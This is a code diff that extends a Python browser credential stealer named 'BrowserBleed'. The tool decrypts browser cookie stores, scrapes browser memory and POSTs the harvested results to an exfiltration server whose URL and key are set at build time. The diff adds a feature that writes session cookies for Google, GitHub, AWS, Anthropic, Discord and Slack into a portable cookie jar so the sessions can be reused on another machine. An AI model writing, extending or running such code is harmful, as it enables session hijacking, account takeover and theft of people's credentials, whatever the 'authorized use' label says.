@@ -822,6 +822,65 @@ def _query_cookies(conn: sqlite3.Connection, master_key: bytes) -> list[dict]:
         return results
 
 
+def _get_domain_from_service(service: str) -> str:
+    """Extract domain from service name."""
+    service_domains = {
+        "Google": ".google.com",
+        "GitHub": ".github.com",
+        "LinkedIn": ".linkedin.com",
+        "AWS": ".aws.amazon.com",
+        "Anthropic": ".claude.ai",
+        "Discord": ".discord.com",
+        "Slack": ".slack.com",
+    }
+    for key, domain in service_domains.items():
+        if key.lower() in service.lower():
+            return domain
+    # Fallback
+    parts = service.split()
+    if parts:
+        return f".{parts[0].lower()}.com"
+    return ""
+
+
+def export_cookies_to_jar(cookies: list[dict], output_path: str) -> None:
+    """
+    Export cookies to Netscape cookie jar format for portable use.
+    Format: domain flag path secure expiration name value
+
+    This jar can be imported on a different machine to authenticate sessions.
+    """
+    lines = [
+        "# Netscape HTTP Cookie File",
+        "# This is a generated file for credential extraction.",
+        "# Format: domain flag path secure expiration name value",
+        ""
+    ]
+
+    for cookie in cookies:
+        domain = cookie.get("domain", "")
+        path = cookie.get("path", "/")
+        name = cookie.get("name", "")
+        value = cookie.get("value", "")
+        secure = "TRUE" if cookie.get("secure") else "FALSE"
+        httponly = cookie.get("httponly", False)
+        expires = cookie.get("expires", 0)
+
+        # Skip empty cookies
+        if not domain or not name:
+            continue
+
+        # Netscape format: domain flag path secure expiration name value
+        flag = "TRUE" if domain.startswith(".") else "FALSE"
+        line = f"{domain}\t{flag}\t{path}\t{secure}\t{expires}\t{name}\t{value}"
+        lines.append(line)
+
+    with open(output_path, "w", encoding="utf-8") as f:
+        f.write("\n".join(lines))
+
+    print(f"[+] Exported {len(cookies)} cookies to: {output_path}")
+
+
 def extract_cookies(profile_path: str, master_key: bytes) -> list[dict]:
     for candidate in [os.path.join("Network", "Cookies"), "Cookies"]:
         db_path = os.path.normpath(os.path.join(profile_path, candidate))
@@ -2064,14 +2123,15 @@ def main():
     parser = argparse.ArgumentParser(
         description="BrowserBleed - Browser Credential Extractor. Authorized use only."
     )
-    parser.add_argument("--browser",     metavar="NAME", default=_DEFAULT_BROWSER or None, help="Target one browser (e.g. chrome, edge, brave)")
-    parser.add_argument("--disk-only",   action="store_true", default=_DEFAULT_DISK_ONLY,   help="Skip memory scraping")
-    parser.add_argument("--memory-only", action="store_true", default=_DEFAULT_MEMORY_ONLY, help="Skip disk extraction")
-    parser.add_argument("--out",         metavar="PATH",      help="Output file path (default: none when server is baked in, otherwise bb_results.txt next to exe)")
-    parser.add_argument("--max-hits",    type=int, default=_DEFAULT_MAX_HITS, help="Max memory hits per browser before dedup (default: 1000)")
-    parser.add_argument("--verify",      action="store_true", default=_DEFAULT_VERIFY,      help="Verify captured tokens against their services (makes outbound requests)")
-    parser.add_argument("--exfil",       metavar="URL",       default=_EXFIL_URL or None, help="POST results to report server (default: baked in at build time)")
-    parser.add_argument("--exfil-key",   metavar="KEY",       default=_EXFIL_KEY or None, help="API key for --exfil (default: baked in at build time)")
+    parser.add_argument("--browser",          metavar="NAME", default=_DEFAULT_BROWSER or None, help="Target one browser (e.g. chrome, edge, brave)")
+    parser.add_argument("--disk-only",        action="store_true", default=_DEFAULT_DISK_ONLY,   help="Skip memory scraping")
+    parser.add_argument("--memory-only",      action="store_true", default=_DEFAULT_MEMORY_ONLY, help="Skip disk extraction")
+    parser.add_argument("--out",              metavar="PATH",      help="Output file path (default: none when server is baked in, otherwise bb_results.txt next to exe)")
+    parser.add_argument("--max-hits",         type=int, default=_DEFAULT_MAX_HITS, help="Max memory hits per browser before dedup (default: 1000)")
+    parser.add_argument("--verify",           action="store_true", default=_DEFAULT_VERIFY,      help="Verify captured tokens against their services (makes outbound requests)")
+    parser.add_argument("--export-cookies",   metavar="PATH",      help="Export browser cookies to Netscape jar file for portable use on another machine")
+    parser.add_argument("--exfil",            metavar="URL",       default=_EXFIL_URL or None, help="POST results to report server (default: baked in at build time)")
+    parser.add_argument("--exfil-key",        metavar="KEY",       default=_EXFIL_KEY or None, help="API key for --exfil (default: baked in at build time)")
     args = parser.parse_args()
 
     if args.verify:
@@ -2243,6 +2303,33 @@ def main():
             writer = _csv.DictWriter(f, fieldnames=["browser", "profile", "label", "service", "value", "address"])
             writer.writeheader()
             writer.writerows(all_csv_rows)
+
+    # Export cookies to jar file if requested
+    if args.export_cookies:
+        try:
+            # Extract cookies from CSV rows
+            cookies_to_export = []
+            for row in all_csv_rows:
+                if row.get("label") in ["Google SAPISID", "Session ID", "Session token", "Anthropic session"] or \
+                   row.get("label", "").endswith("Session"):
+                    # This is a cookie-like credential
+                    cookie = {
+                        "domain": _get_domain_from_service(row.get("service", "")),
+                        "name": row.get("label", "").replace("Session ID", "").replace("Session token", "").strip(),
+                        "value": row.get("value", ""),
+                        "path": "/",
+                        "secure": True,
+                        "httponly": True,
+                        "expires": int((datetime.now(timezone.utc) + timedelta(days=365)).timestamp()),
+                    }
+                    if cookie["domain"] and cookie["value"]:
+                        cookies_to_export.append(cookie)
+
+            if cookies_to_export:
+                export_cookies_to_jar(cookies_to_export, args.export_cookies)
+                print(f"[+] Cookies exported to: {args.export_cookies}")
+        except Exception as e:
+            print(f"[-] Cookie export failed: {e}")
 
     if args.exfil and args.exfil_key:
         report_url = _exfil_results(args.exfil, args.exfil_key, out_path, csv_path if all_csv_rows else None)
